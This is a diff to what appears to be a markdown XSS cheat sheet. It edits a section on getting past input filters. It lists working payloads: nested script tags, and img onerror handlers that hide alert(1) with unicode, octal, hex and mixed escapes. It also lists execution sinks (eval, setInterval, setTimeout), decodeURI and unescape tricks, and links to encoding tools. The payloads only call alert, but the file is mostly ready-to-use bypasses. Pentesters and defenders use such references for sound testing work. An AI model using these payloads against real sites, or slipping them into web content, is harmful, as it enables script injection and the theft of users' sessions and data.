@@ -201,33 +201,38 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 `<sCR<script>iPt>alert(1)</SCr</script>IPt>`
 
 ### Scaping Quote
-  
 ### Methods
   
--> String.fromCharCode()
-  
--> unescape
+-> String.fromCharCode()  
+-> unescape  
 
-Examples:
- 
+e.g.  
 -> decode URI + unescape method  
 `decodeURI(/alert(%22xss%22)/.source)`  
-`decodeURIComponent(/alert(%22xss%22)/.source)`
-  
-Add execution sink:
-  
+`decodeURIComponent(/alert(%22xss%22)/.source)`  
+ 
+### Other bypass techniques
+
+-> unicode  
+`<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/> `
+
+Add execution sink:  
 -> eval  
 -> setInterval  
 -> setTimeout  
 
-### Escaping Parentheses
-  
-`<img src=x onerror="\u0061lert(1)"/>`  
+-> octal  
 `<img src=x onerror="eval('\141lert(1)')"/>`  
-`<img src=x onerror="eval('\x61lert(1)')"/>`
+-> hexadecimal  
+`<img src=x onerror="setInterval('\x61lert(1)')"/>`  
+-> mix  (uni, hex, octa)  
+`<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>`
+
+https://checkserp.com/encode/unicode/  
+http://www.unit-conversion.info/texttools/octal/
+http://www.unit-conversion.info/texttools/hexadecimal/
 
 ### Others Examples
-
 #### HTML Tag
 
 ```
